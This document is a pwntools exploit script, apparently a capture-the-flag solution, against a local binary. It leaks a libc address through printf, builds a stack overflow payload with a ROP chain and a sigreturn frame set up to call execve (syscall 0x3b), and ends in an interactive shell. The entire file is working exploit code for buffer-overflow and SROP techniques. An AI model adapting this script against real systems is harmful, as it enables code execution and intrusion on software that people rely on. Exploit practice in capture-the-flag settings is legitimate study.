from pwn import *

p=process("../src/./program")
#p=remote("127.0.0.1","8000")
elf=ELF("../src/./program")
gdb.attach(p)
context(os='linux',arch='amd64')
context.log_level='DEBUG'

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

syscall=0x000000000040130f
pop_rax=0x000000000040130d

addr=p.recvuntil(b"useful ")
addr=p.recv(14)
addr=int(addr,16)-libc.sym.printf
print(hex(addr))

frame=SigreturnFrame()
frame.rax=0x3b
frame.rdi=addr+0x197e34
frame.rsi=0
frame.rsp=0x4040000
frame.rdx=0
frame.rip=syscall

p.sendlineafter(b"size of message:",b"2400")
payload_1=b"A"*120+p64(0x0000000000401016)+p64(pop_rax)+p64(0xf)+p64(syscall)+bytes(frame)
payload_1+=b"A"*(2192-len(payload_1))
payload_1+=p64(addr+0x01d66c8)
payload_1+=b"A"*100

p.sendlineafter(b"Enter your messaage:",payload_1)

p.interactive()
